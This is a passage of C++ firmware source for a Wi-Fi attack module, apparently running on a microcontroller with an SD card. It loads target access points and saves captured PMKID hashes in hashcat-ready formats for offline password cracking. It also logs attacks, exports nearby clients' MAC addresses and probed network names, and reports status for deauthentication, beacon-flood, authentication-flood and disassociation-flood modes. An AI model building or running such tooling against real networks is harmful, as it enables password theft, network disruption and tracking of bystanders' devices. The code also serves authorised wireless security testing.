                    _aps[_apCount].wps      = (bool)(o["wps"] | false);
                    const char* bssidStr = o["bssid"] | "00:00:00:00:00:00";
                    unsigned int b[6] = {};
                    sscanf(bssidStr, "%x:%x:%x:%x:%x:%x",
                           &b[0],&b[1],&b[2],&b[3],&b[4],&b[5]);
                    for (int i = 0; i < 6; i++) _aps[_apCount].bssid[i] = (uint8_t)b[i];
                    _apCount++;
                }
                _logEvent("Targets loaded from SD fallback (%u APs)", _apCount);
                return;
            }
        }
        _logEvent("loadTargets: file not found");
        return;
    }
    if (!f) { _logEvent("loadTargets: file not found"); return; }
    JsonDocument doc;
    if (deserializeJson(doc, f)) {
        f.close();
        _logEvent("loadTargets: JSON parse error");
        return;
    }
    f.close();

    JsonArray arr = doc["aps"];
    _apCount = 0;
    for (JsonObject o : arr) {
        if (_apCount >= 20) break;
        memset(&_aps[_apCount], 0, sizeof(WpenAP));
        const char* ssid = o["ssid"] | "";
        strncpy(_aps[_apCount].ssid, ssid, 32);
        _aps[_apCount].rssi     = (int8_t)(o["rssi"] | -100);
        _aps[_apCount].channel  = (uint8_t)(o["channel"] | 1);
        _aps[_apCount].authmode = (uint8_t)(o["auth"] | 0);
        _aps[_apCount].wps      = (bool)(o["wps"] | false);
        const char* bssidStr = o["bssid"] | "00:00:00:00:00:00";
        unsigned int b[6] = {};
        sscanf(bssidStr, "%x:%x:%x:%x:%x:%x",
               &b[0],&b[1],&b[2],&b[3],&b[4],&b[5]);
        for (int i = 0; i < 6; i++) _aps[_apCount].bssid[i] = (uint8_t)b[i];
        _apCount++;
    }
    _logEvent("Targets loaded (%u APs)", _apCount);
}

// ── SD integration (features 30-33) ─────────────────────────

// Feature 30: save hcx22000 format to SD
bool WifiPenModule::saveHcx22000ToSD() {
    if (!sdMgr.isAvailable()) return false;
    String content = pmkidHcx22000();
    if (content.isEmpty()) return false;
    sdMgr.makeDir("/wpen");
    char bssid[18];
    if (_tIdx < _apCount) {
        snprintf(bssid, sizeof(bssid), "%02x%02x%02x%02x%02x%02x",
                 _aps[_tIdx].bssid[0], _aps[_tIdx].bssid[1], _aps[_tIdx].bssid[2],
                 _aps[_tIdx].bssid[3], _aps[_tIdx].bssid[4], _aps[_tIdx].bssid[5]);
    } else {
        strncpy(bssid, "unknown", sizeof(bssid));
    }
    File f = sdMgr.openForWrite(String("/wpen/pmkid_") + bssid + ".22000");
    if (!f) return false;
    f.print(content);
    f.close();
    _logEvent("HCX22000 saved to SD");
    return true;
}

// Feature 30: save PMKID txt to SD
bool WifiPenModule::savePmkidToSD() {
    if (!sdMgr.isAvailable()) return false;
    String content = pmkidHashcat();
    if (content.isEmpty()) return false;
    sdMgr.makeDir("/wpen");
    char bssid[18];
    if (_tIdx < _apCount) {
        snprintf(bssid, sizeof(bssid), "%02x%02x%02x%02x%02x%02x",
                 _aps[_tIdx].bssid[0], _aps[_tIdx].bssid[1], _aps[_tIdx].bssid[2],
                 _aps[_tIdx].bssid[3], _aps[_tIdx].bssid[4], _aps[_tIdx].bssid[5]);
    } else {
        strncpy(bssid, "unknown", sizeof(bssid));
    }
    File f = sdMgr.openForWrite(String("/wpen/pmkid_") + bssid + ".txt");
    if (!f) return false;
    f.print(content);
    f.close();
    _logEvent("PMKID txt saved to SD");
    return true;
}

// Feature 31: flush attack log to SD (append mode)
bool WifiPenModule::flushAttackLogToSD() {
    if (!sdMgr.isAvailable()) return false;
    String logData = attackLogJson();
    if (logData.isEmpty() || logData == "[]") return false;
    sdMgr.makeDir("/wpen");
    sdMgr.writeAsync("/wpen/attack.log", logData + "\n", true);
    return true;
}

// Feature 33: export clients to SD CSV
bool WifiPenModule::exportClientsToSD() {
    if (!sdMgr.isAvailable()) return false;
    if (_clientCount == 0) return false;
    sdMgr.makeDir("/wpen");
    String fname = String("/wpen/clients_") + String((uint32_t)millis()) + ".csv";
    File f = sdMgr.openForWrite(fname);
    if (!f) return false;
    f.print("mac,oui\n");
    for (uint8_t i = 0; i < _clientCount; i++) {
        char b[18];
        snprintf(b, sizeof(b), "%02x:%02x:%02x:%02x:%02x:%02x",
                 _clients[i].mac[0], _clients[i].mac[1], _clients[i].mac[2],
                 _clients[i].mac[3], _clients[i].mac[4], _clients[i].mac[5]);
        const char* oui = ouiLookup(_clients[i].mac);
        f.print(String(b) + "," + String(oui) + "\n");
    }
    f.close();
    _logEvent("Clients exported to SD: %s", fname.c_str());
    return true;
}

// Feature 33: export probes to SD CSV
bool WifiPenModule::exportProbesToSD() {
    if (!sdMgr.isAvailable()) return false;
    if (_probeCount == 0) return false;
    sdMgr.makeDir("/wpen");
    String fname = String("/wpen/probes_") + String((uint32_t)millis()) + ".csv";
    File f = sdMgr.openForWrite(fname);
    if (!f) return false;
    f.print("mac,ssid,rssi,oui\n");
    for (uint8_t i = 0; i < _probeCount; i++) {
        char b[18];
        snprintf(b, sizeof(b), "%02x:%02x:%02x:%02x:%02x:%02x",
                 _probes[i].mac[0], _probes[i].mac[1], _probes[i].mac[2],
                 _probes[i].mac[3], _probes[i].mac[4], _probes[i].mac[5]);
        const char* oui = ouiLookup(_probes[i].mac);
        f.print(String(b) + ",\"" + String(_probes[i].ssid) + "\","
                + String(_probes[i].rssi) + "," + String(oui) + "\n");
    }
    f.close();
    _logEvent("Probes exported to SD: %s", fname.c_str());
    return true;
}

// ── Status JSON ───────────────────────────────────────────────
String WifiPenModule::statusJson() const {
    const char* st[] = {"idle","running","finished","timeout"};
    const char* ty[] = {
        "passive","handshake","pmkid","dos","beacon_flood","probe_sniffer",
        "auth_flood","disassoc_flood"
    };
    uint8_t si = min((uint8_t)_state, (uint8_t)3);
    uint8_t ti = min((uint8_t)_atype, (uint8_t)7);

    uint16_t pmkidCount = _countPmkids(_pmkidHead);

    String j = "{\"enabled\":"      + String(_enabled  ?"true":"false")
             + ",\"state\":\""      + st[si] + "\""
             + ",\"type\":\""       + ty[ti] + "\""
             + ",\"target\":\""     + (_apCount > _tIdx ? String(_aps[_tIdx].ssid) : "") + "\""
             + ",\"pcapBytes\":"    + String((unsigned)_pcapSz)
             + ",\"hccapxPair\":"   + String((int)_hccapx.message_pair)
             + ",\"pmkids\":"       + String(_pmkidHead ? "true" : "false")
             + ",\"pmkidCount\":"   + String(pmkidCount)
             + ",\"hop\":"          + String(_hopActive ? "true":"false")
             + ",\"elapsed\":"      + String(_state==WpenState::RUNNING ? millis()-_tStart : 0UL)
             + ",\"clients\":"      + String(_clientCount)
             + ",\"saeFrames\":"    + String(_saeFrameCount)
             + ",\"probes\":"       + String(_probeCount)
             + ",\"autoChLock\":"   + String(_autoChannelLock ? "true" : "false")
             + ",\"lockedCh\":"     + String(_lockedChannel)
             + ",\"frameCount\":"   + String(_frameCount)
             + ",\"deauthPps\":"    + String(_deauthPps)
             + ",\"uptimeSec\":"    + String(targetUptimeSec())
             + ",\"multiTarget\":"  + String(_multiTarget ? "true" : "false")
             + "}";
    return j;
}
